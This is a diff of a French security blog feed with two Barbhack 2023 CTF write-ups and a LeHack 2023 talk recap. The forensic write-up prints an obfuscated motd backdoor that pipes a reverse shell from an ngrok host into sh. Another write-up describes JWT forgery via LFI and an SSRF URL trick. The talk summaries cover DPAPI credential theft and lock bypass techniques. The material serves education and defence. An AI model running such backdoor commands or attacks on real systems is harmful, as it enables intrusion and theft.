+&lt;p&gt;Nous devons retrouver les traces d’un shell, donc nous cherchons à observer dans un premier temps les processus, l’historique de commande de l’utilisateur, les fichiers disponibles, les historiques de navigation web et les fichiers de log.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Historique de commande&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/ripmypxe/command-history.png&quot; alt=&quot;command-history&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Processus&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/ripmypxe/ps-aux.png&quot; alt=&quot;ps-aux&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Historique de navigation&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/ripmypxe/firefox-history.png&quot; alt=&quot;firefox-history&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Fichiers de l’utilisateur&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/ripmypxe/documents.png&quot; alt=&quot;documents&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Fichiers de logs&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Nous ne trouvons rien dans les fichiers de logs par défaut et notre attention se porte sur le dossier &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;installer&lt;/code&gt; présent dans &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/&lt;/code&gt; :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/ripmypxe/log-subiquity.png&quot; alt=&quot;log-subiquity&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous retrouvons dans le fichier &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subiquity-server-debug.log.2368&lt;/code&gt; la commande qui a permis d’insérer la backdoor :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/ripmypxe/backdoor-command.png&quot; alt=&quot;backdoor-command&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;echo -n Y3VybCBodHRwczovL3JldmVyc2Utc2hlbGwuc2gvMC50Y3AuZXUubmdyb2suaW86MTcyMjQgfCBzaCAgJg== | base64 -d | sh&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /target/etc/update-motd.d/00-header
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;L’opération effectué ici est le décodage de la chaîne en base 64 à la fin du fichier &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/update-motd.d/00-header&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Nous décodons donc la chaîne de base 64 :&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl https://reverse-shell.sh/0.tcp.eu.ngrok.io:17224 | sh  &amp;amp;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Cette commande va donc récupérer un reverse shell et le lancer à chaque fois que l’affichage du motd sera déclenché. Nous obtenons donc la première partie du flag &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brb{0.tcp.eu.ngrok.io:17224:nom_du_binaire}&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Nous devons trouver le nom du binaire qui à déclenché la backdoor, donc par conséquent, l’affichage du motd. Par défaut le motd est affiché à chaque nouvelle connexion distante sur le système, nous avons aperçu l’utilisation de commandes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnet&lt;/code&gt; et &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Nous tentons le flag : &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brb{0.tcp.eu.ngrok.io:17224:ssh}&lt;/code&gt;&lt;/strong&gt; qui sera validé par la plateforme du ctf.%&lt;/p&gt;</content><author><name></name></author><category term="Barbhack-2023" /><summary type="html">RIP_My_PXE</summary></entry><entry><title type="html">Intleaks</title><link href="http://localhost:4000/barbhack-2023/intleaks.html" rel="alternate" type="text/html" title="Intleaks" /><published>2023-08-26T00:00:00+02:00</published><updated>2023-08-26T00:00:00+02:00</updated><id>http://localhost:4000/barbhack-2023/intleaks</id><content type="html" xml:base="http://localhost:4000/barbhack-2023/intleaks.html">&lt;h1 id=&quot;intleaks&quot;&gt;&lt;strong&gt;INTLEAKS&lt;/strong&gt;&lt;/h1&gt;
+
+&lt;p&gt;Nous nous attaquons au challenge Web INTLEAKS. Il s’agit d’une application dont le but est de partager des documents dévoilés par des lanceurs d’alertes. La page d’accueil indique que deux serveurs interne hébergent des fichiers dévoilés. L’un d’entre eux comprend les fichiers approuvés, et l’autre ceux qui ne l’ont pas été. L’objectif de ce challenge est d’atteindre un fichier secret qui n’a pas encore été approuvé et dévoilé.&lt;/p&gt;
+
+&lt;p&gt;Dans un premier temps, nous remarquons sur la page d’accueil qu’un bouton permet aux utilisateurs de s’authentifier à l’API en tant qu’anonyme.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901133133813.png&quot; alt=&quot;image-20230901133133813&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ce bouton requête le endpoint &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/api/auth&lt;/code&gt;, nous délivrant un jeton JWT :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132724512.png&quot; alt=&quot;image-20230901132724512&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous analysons le contenu de celui-ci. Nous constatons qu’il est signé à l’aide de l’algorithme HS512, symétrique, dont la clé est ici à priori stockée dans le fichier indiqué par l’entête « kid ». Nous notons également la présence d’un paramètre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;acl&quot; :  &quot;anon&quot;&lt;/code&gt; dans le corps de ce jeton.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132741789.png&quot; alt=&quot;image-20230901132741789&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Il est possible d’identifier certains endpoints de l’API depuis le code source de la page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132754256.png&quot; alt=&quot;image-20230901132754256&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Le endpoint &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/api/me&lt;/code&gt; permet d’afficher nos privilèges en se basant sur notre JWT.&lt;/p&gt;
+
+&lt;p&gt;Toujours depuis la page d’accueil, nous pouvons accéder à des documents. Ceux-ci correspondent aux documents ayant été « dévoilés et approuvés ».&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132829256.png&quot; alt=&quot;image-20230901132829256&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous remarquons un paramètre dans l’URL correspondant au document à lire. En manipulant ce paramètre, un message indique que le nom de fichier doit se terminer par &lt;em&gt;.disclosed&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132842161.png&quot; alt=&quot;image-20230901132842161&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous parvenons également à déclencher d’autres messages d’erreurs, indiquant que cette fonctionnalité émet des requêtes HTTP de la forme suivante :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;http://files.internal{location}&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;files.internal&lt;/strong&gt; correspond donc au serveur dont les fichiers ont été « dévoilés et approuvés ».&lt;/p&gt;
+
+&lt;p&gt;Nous remarquons ensuite que les caractères « ? » et « # » nous permettent d’échapper la vérification de l’extension. Le directory listing étant activé sur &lt;strong&gt;files.internal&lt;/strong&gt;, nous parvenons ainsi à lister les fichiers présents sur ce serveur web, et à y accéder en lecture. Nous parvenons notamment à lire les fichiers source &lt;em&gt;app.py&lt;/em&gt; et &lt;em&gt;jwt.py&lt;/em&gt;, également présents sur ce serveur et contenant le code source des fonctionnalités de l’API.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132905960.png&quot; alt=&quot;image-20230901132905960&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A partir de ce code source, nous pouvons comprendre comment sont générés les jetons JWT servant à gérer l’authentification. A partir du code source, nous identifions une LFI (Local File Inclusion) dans l’entête JKI du JWT.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132931988.png&quot; alt=&quot;image-20230901132931988&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cet entête prend en entrée un fichier correspondant à la clé permettant de signer le jeton JWT. Ainsi, sélectionner en entrée un fichier dont nous connaissons le contenu revient à connaitre la clé permettant de signer le jeton.&lt;/p&gt;
+
+&lt;p&gt;De plus, nous remarquons qu’un JWT est considéré comme administrateur s’il contient, dans son corps, l’entrée suivante :&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;acl&quot; : &quot;admin&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132956918.png&quot; alt=&quot;image-20230901132956918&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous cherchons donc à modifier le contenu de notre JWT. Ayant obtenu le contenu de quelques fichiers sur le serveur, par exemple « app.py », nous pouvons utiliser ce fichier comme clé pour générer une signature valide, et spécifier le chemin vers ce même fichier dans l’entête « kid » à l’aide de la LFI.&lt;/p&gt;
+
+&lt;p&gt;Nous réalisons donc un script python afin de générer un jeton JWT administrateur valide, prenant en compte les éléments précédemment énoncés.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901133015565.png&quot; alt=&quot;image-20230901133015565&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous validons ensuite que le JWT forgé est bien valide en nous connectant à l’application.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132132341.png&quot; alt=&quot;image-20230901132132341&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous sommes à présent en mesure de requêter le endpoint &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/api/leaks&lt;/code&gt;. Le serveur nous retourne le nom du fichier « caché » recherché, et d’après le code source, nous pouvons comprendre que celui est hébergé sur le serveur « whisteblower.internal ».&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901133036443.png&quot; alt=&quot;image-20230901133036443&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132048027.png&quot; alt=&quot;image-20230901132048027&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;N’ayant pas accès directement à ce serveur, nous cherchons à forcer l’application à le requêter via une attaque de type SSRF.&lt;/p&gt;
+
+&lt;p&gt;Pour ce faire, nous pouvons réutiliser le endpoint « /api/document » et manipuler le paramètre &lt;strong&gt;location&lt;/strong&gt; afin de forger une requête vers le serveur whistleblower.internal :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;http://internal.fs@whisteblower.internal/&lt;strong&gt;{leak_file}&lt;/strong&gt;?.disclosed&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Nous avons ainsi gagné accès en lecture au fichier recherché et résolu ce challenge :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901133052785.png&quot; alt=&quot;image-20230901133052785&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="Barbhack-2023" /><summary type="html">INTLEAKS</summary></entry><entry><title type="html">Le hack 2023</title><link href="http://localhost:4000/articles/lehack_2023.html" rel="alternate" type="text/html" title="Le hack 2023" /><published>2023-06-30T00:00:00+02:00</published><updated>2023-06-30T00:00:00+02:00</updated><id>http://localhost:4000/articles/lehack_2023</id><content type="html" xml:base="http://localhost:4000/articles/lehack_2023.html">&lt;h1 id=&quot;advens-à-lévènement-lehack-2023&quot;&gt;Advens à l’évènement LeHack 2023&lt;/h1&gt;
+
+&lt;p&gt;Cette année encore, notre Redteam était au rendez-vous pour assister à l’évènement LeHack.&lt;/p&gt;
+
+&lt;p&gt;Existant depuis 2001 (auparavant nommée “Nuit du Hack” jusqu’en 2019), cette convention propose de réunir les passionnés de sécurité informatique autour de divers stands d’entreprises du secteur mais aussi des associations et écoles spécialisées.&lt;/p&gt;
+
+&lt;p&gt;Des conférences techniques ont lieu tout au long de l’évènement et laissent divers intervenants présenter les résultats de leurs sujets de recherche dont voici quelques résumés :&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;conférence-du-driver-windows-à-ledr-par-aurélien-chalot&quot;&gt;Conférence “Du Driver Windows à l’EDR” par &lt;a href=&quot;https://twitter.com/Defte_&quot;&gt;Aurélien CHALOT&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;&lt;em&gt;De nos jours, pour détecter les malwares, les antivirus reposent principalement sur l’analyse dynamique. Pour étudier le comportement d’un malware, il est nécessaire que les solutions d’antivirus aient le moyen d’intercepter ses actions. Pour cela, Microsoft a ajouté au sein de l’OS Windows ce que l’on appelle des kernel callbacks. Ces kernels callbacks sont en fait des fonctions de l’API Windows qui permettent, moyennant un niveau de privilège fort, d’intercepter les actions d’un malware. Pour avoir les privilèges suffisants, il est nécessaire que ces fonctions soient utilisées par un certain type de composant : les drivers.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Source : &lt;a href=&quot;https://lehack.org/fr/track/du-driver-windows-a-ledr/&quot;&gt;https://lehack.org/fr/track/du-driver-windows-a-ledr/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Lors de cette conférence, Aurélien a retracé l’historique des divers moyens utilisés au cours des dernières décennies pour protéger nos systèmes contre les logiciels malveillants. La technicité et l’innovation des attaquants évoluant au rythme asynchrone des évolutions techniques permettant de repérer ces derniers, nous en sommes alors à l’époque des EDR (Endpoint detection and response).&lt;/p&gt;
+
+&lt;p&gt;C’est dans un objectif d’auto-apprentissage qu’Aurélien a alors décidé d’entreprendre le développement d’un “EDR maison”. Cet EDR utilisant les fonctionnalités de l’API Windows (et particulièrement les kernels callbacks, dont les spécificités sont présentées en conférence), il faudra alors développer un driver.&lt;/p&gt;
+
+&lt;p&gt;Au travers d’exemples de code, la conférence met alors l’accent sur la complexité liée à ce type de développement bas niveau, ainsi que les contraintes que les EDR doivent alors surmonter avant même de démontrer leur efficacité.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;conférence-parasitage-de-serveur-for-fun-and-profit-de-damien-virtualabs-cauquil&quot;&gt;Conférence &lt;strong&gt;Parasitage de serveur for fun and profit&lt;/strong&gt; de &lt;a href=&quot;https://twitter.com/virtualabs&quot;&gt;Damien &lt;em&gt;Virtualabs&lt;/em&gt; CAUQUIL&lt;/a&gt;.&lt;/h2&gt;
+
+&lt;p&gt;&lt;em&gt;Les serveurs et applications web reposent sur des technologies qui peuvent dans certains cas être détournées et utilisées à des fins non-prévues. Il est ainsi possible de parasiter un serveur ou une application en y stockant des données sans que ces derniers ne s’en rendent compte tout en permettant leur récupération dans un délai plus ou moins court, et ce sans nécessité d’authentification ou que cela soit facilement détectable !&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Source : &lt;a href=&quot;https://lehack.org/track/parasitage-de-serveur-for-fun-and-profit/&quot;&gt;https://lehack.org/track/parasitage-de-serveur-for-fun-and-profit/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous allons vous présenter cette méthode simple et ingénieuse de détournement d’application pour stocker des fichiers sans même être authentifié.&lt;/p&gt;
+
+&lt;p&gt;Prenons comme exemple une application disposant d’une mire d’authentification :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/lehack23/Parasite1.png&quot; alt=&quot;authent&quot; title=&quot;Notre application avec une mire d&apos;authentification&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous constatons que le formulaire pour ajouter son adresse mail ne contrôle pas le format du texte renseigné, ni sa longueur.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Session 1 :&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/lehack23/Parasite2.png&quot; alt=&quot;email&quot; title=&quot;Formulaire email&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;De plus, un cookie stocke la valeur écrite dans le formulaire.
+C’est un cookie dont le paramètre &lt;em&gt;durée maximum&lt;/em&gt; est fixé à &lt;em&gt;Session&lt;/em&gt;. Cela signifie que si l’on recharge la page d’authentification le cookie reste le même et la valeur d’email réapparaît dans le formulaire. Si nous fermons la page ou le navigateur, le cookie est supprimé côté client et le formulaire &lt;em&gt;Email address&lt;/em&gt; n’est plus auto-rempli.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Session 2 :&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/lehack23/Parasite3.png&quot; alt=&quot;new&quot; title=&quot;Nouveau cookie&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cependant, cela ne signifie pas qu’il ait également bien été supprimé côté serveur. Des cookies de sessions et les informations qui y sont liées peuvent être stockés des heures, des jours ou des mois après la fin de la session, en fonction de la configuration du serveur.&lt;/p&gt;
+
+&lt;p&gt;Par exemple, si nous regardons sur le serveur hébergeant l’application, nous constatons que les cookies des deux sessions sont présents, même si la première est terminée.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/lehack23/Parasite4.png&quot; alt=&quot;ls&quot; title=&quot;ls cookie&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous pouvons y retrouver la valeur que nous avions entrée dans le formulaire &lt;em&gt;Email address&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/lehack23/Parasite5.png&quot; alt=&quot;cat&quot; title=&quot;cat cookie&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous souhaitons alors stocker le contenu d’un fichier à la place du message &lt;em&gt;Bonjour&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;Nous encodons une image PNG en base 64. Cela fonctionne avec tout autre type de fichier.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/lehack23/Parasite6.png&quot; alt=&quot;png&quot; title=&quot;Png en base 64&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous renseignons notre image encodée en base 64 dans le formulaire &lt;em&gt;Email address&lt;/em&gt; et nous sauvegardons la valeur du cookie de notre session.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/lehack23/Parasite7.png&quot; alt=&quot;depot&quot; title=&quot;Depot de l&apos;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;L’image est bien écrite sur le serveur :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/lehack23/Parasite8.png&quot; alt=&quot;image&quot; title=&quot;Image sur le serveur&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Quelques jours plus tard, nous pouvons récupérer notre document en remplissant la valeur du cookie de la session dans notre navigateur.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/lehack23/Parasite9.png&quot; alt=&quot;recuperation&quot; title=&quot;Image récupération&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pour éviter le parasitage de votre serveur, nous vous invitons à :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Contrôler le format et la longueur de tout texte renseigné par un utilisateur;&lt;/li&gt;
+  &lt;li&gt;Initialiser un cookie de session après l’authentification réussie de l’utilisateur;&lt;/li&gt;
+  &lt;li&gt;Supprimer côté serveur le cookie lors de la déconnexion de l’utilisateur;&lt;/li&gt;
+  &lt;li&gt;Utiliser un antivirus sur votre serveur pour supprimer les fichiers malveillants.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;conférence-prototype-pollution-and-where-to-find-them-par-bitk-et-sakiir&quot;&gt;Conférence “Prototype pollution and where to find them” par &lt;a href=&quot;https://twitter.com/bitk_&quot;&gt;Bitk&lt;/a&gt; et &lt;a href=&quot;https://twitter.com/sakiirsecurity&quot;&gt;Sakiir&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;&lt;em&gt;La pollution des prototypes est une vulnérabilité dans les applications JavaScript qui peut avoir des impacts variables en fonction de la complexité et de la nature de l’application affectée. Elle exploite la fonction d’héritage de prototype JavaScript, qui permet aux objets d’hériter de propriétés et de méthodes. En manipulant la chaîne de prototypes d’un objet, un attaquant peut introduire des propriétés malveillantes, conduisant à un comportement inattendu et permettant potentiellement à l’attaquant d’exécuter du code arbitraire.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Source : &lt;a href=&quot;https://lehack.org/fr/track/prototype-pollution-and-where-to-find-them/&quot;&gt;https://lehack.org/fr/track/prototype-pollution-and-where-to-find-them/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;La conférence avait pour but de présenter un aperçu des prototypes JavaScript et des attaques par pollution de ceux-ci.&lt;/p&gt;
+
+&lt;p&gt;Un outil destiné à détecter ce type d’attaque en audit de code ou bien en test d’intrusion en boîte blanche nous a été présenté afin d’identifier plus facilement ce type de vulnérabilité sur de grosses applications basées sur le langage Javascript. Celui ci est accessible sur le gitlab suivant : &lt;a href=&quot;https://github.com/yeswehack/pp-finder&quot;&gt;https://github.com/yeswehack/pp-finder&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Enfin, plusieurs exemples de détection et d’exploitation de prototype pollution dans un context de test d’intrusion en boîte noire nous ont été présentés. Des exemples de charges utiles permettant d’exploiter les attaques de prototype pollution sur des frameworks ou librairies JavaScripts connus tels que VueJS ^3.2.47, Fastify ^4.13.0 ou Axios 0.27.2 ont pu nous être présentées.&lt;/p&gt;
+
+&lt;p&gt;Les conséquences de l’exploitation d’une telle vulnérabilité sont variable en fonction de l’application et des librairies utilisées pouvant permettre de réaliser par la suite une attaque SSRF (Server Side Request Forgery), jusqu’à l’execution de code à distance sur le serveur.&lt;/p&gt;
+
+&lt;p&gt;Pour conclure, les vulnérabilités de prototype pollution sont souvent difficiles à détecter dans une approche de test d’intrusion en boîte noire, et l’exploitation dépend alors majoritairement des composants utilisés par l’application ciblée. Il est aussi important de préciser que l’exploitation de cette vulnérabilité peut avoir des effets de bord important sur l’application pouvant dans certains cas créer un déni de service en corrompant les propriétés de l’application.&lt;/p&gt;
+
+&lt;p&gt;Un article publié sur YesWeHack, résume les différentes manières de détécter et d’exploiter cette vulnérabilité : &lt;a href=&quot;https://blog.yeswehack.com/talent-development/server-side-prototype-pollution-how-to-detect-and-exploit/&quot;&gt;https://blog.yeswehack.com/talent-development/server-side-prototype-pollution-how-to-detect-and-exploit/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;conférence-dpapi---dont-put-administration-passwords-in-par-thomas-seigneuret-et-pierre-alexandre-vandewoestyne&quot;&gt;Conférence “DPAPI - Don’t Put Administration Passwords In” par &lt;a href=&quot;https://twitter.com/_zblurx&quot;&gt;Thomas SEIGNEURET&lt;/a&gt; et &lt;a href=&quot;https://twitter.com/T00uF&quot;&gt;Pierre-Alexandre VANDEWOESTYNE&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;&lt;em&gt;La DPAPI est une API des OS Windows mise à disposition des développeurs pour stocker facilement les secrets des utilisateurs, sans qu’ils aient à se soucier de la partie crypto. Pour les développeurs, il suffit d’utiliser les fonctions Protect et Unprotect pour respectivement stocker de manière sécurisée les données et accéder aux données stockées. Beaucoup de secrets différents sont stockés via la DPAPI : – Mots de passe de Tasks Scheduled – Mots de passe dans les navigateurs (Chrome Based et Internet Explorer) – Clé privée des certificats – Mots de passe de certaines solutions (notamment des solutions d’administrations à distance) – etc. D’un point de vue offensif, ces secrets sont très intéressants à récupérer, pré et post compromission de domaine, et permettent souvent de pousser plus loin la compromission d’un SI.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Source : &lt;a href=&quot;https://lehack.org/fr/track/dpapi-dont-put-administration-passwords-in/&quot;&gt;https://lehack.org/fr/track/dpapi-dont-put-administration-passwords-in/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Une conférence attendue était celle de Thomas Seigneuret et Pierre-Alexandre Vandewoestyne sur la DPAPI. Cette API, propre aux systèmes Windows, permet de faciliter la sauvegarde de secrets.&lt;/p&gt;
+
+&lt;p&gt;Les deux experts expliquent qu’elle peut facilement devenir un outil redoutable pour un attaquant. Il suffit de compromettre un poste ou serveur Windows d’une entreprise pour récupérer de nombreux identifiants tels que des mots de passe de navigateurs, de tâches planifiées, de bureau à distance, ou encore des clés privées de certificats et de points d’accès Wi-Fi.&lt;/p&gt;
+
+&lt;p&gt;Pire, pour quelqu’un ayant compromis un contrôleur de domaine Active Directory, il devient possible de rapidement récupérer tous ces identifiants de tous les utilisateurs du domaine. Cela peut rapidement permettre de rebondir sur d’autres périmètres ou services externes à l’entreprise compromise (Tenant Azure, NAS, backups, …).&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;conférence-physical-intrusion-for-fun-and-profit-par-anthony-boens&quot;&gt;Conférence “Physical Intrusion For Fun And Profit” par Anthony BOENS&lt;/h2&gt;
+
+&lt;p&gt;&lt;em&gt;Lors de missions de type intrusion physique, les auditeurs se retrouvent face à différents blocages physiques. Le but de cette présentation a pour objectif de démontrer que nombreux de ces dispositifs de blocage peuvent être contournés facilement et sans entraînement. En effet, qui ne sest jamais retrouvé face à un Digicode en métal ? Une porte fermée avec un cylindre de mauvaise qualité ? Ou encore, un portail télécommandé ?&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Source : &lt;a href=&quot;https://lehack.org/fr/track/physical-intrusion-for-fun-and-profit/&quot;&gt;https://lehack.org/fr/track/physical-intrusion-for-fun-and-profit/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;La première journée de conférences s’est clôturée par une présentation sur les tests d’intrusion physique et plus particulièrement sur des techniques de crochetage, dites de “lockpicking”.&lt;/p&gt;
+
+&lt;p&gt;Anthony a démontré que la plupart des serrures sur le marché peuvent être cassées en très peu de temps. Certaines demandent du matériel spécifique, pour par exemple tester plusieurs dizaines de combinaisons d’un coup et trouver le bon alignement des goupilles en quelques secondes. Mais pour un prix bon marché, la plupart des portes que nous ouvrons au quotidien peuvent facilement être ouvertes à l’insu de leur propriétaire.&lt;/p&gt;
+
+&lt;p&gt;Vous avez peur de laisser des traces en crochetant ? Certaines portes claquées peuvent être ouvertes sans crochetage, simplement à l’aide d’une fine feuille rigide, comme des résultats médicaux de scanner, ou avec votre carte de crédit, comme l’explique Anthony. Cette technique consiste à glisser la carte entre la porte et le bâti et à remonter jusqu’à la serrure en donnant de légers coups dans la porte pour insérer notre carte et libérer le pêne demi-tour pour ouvrir la porte.&lt;/p&gt;
+
+&lt;p&gt;Enfin, les portails et voitures à ouverture à distance n’échappent pas aux attaques par interception de signal radio. En se positionnant entre l’usager et l’équipement, un attaquant peut intercepter le signal envoyé par le “bip” (télécommande). Un simple relai du signal permet d’ouvrir des portes de voitures ou de portails privés.&lt;/p&gt;
+
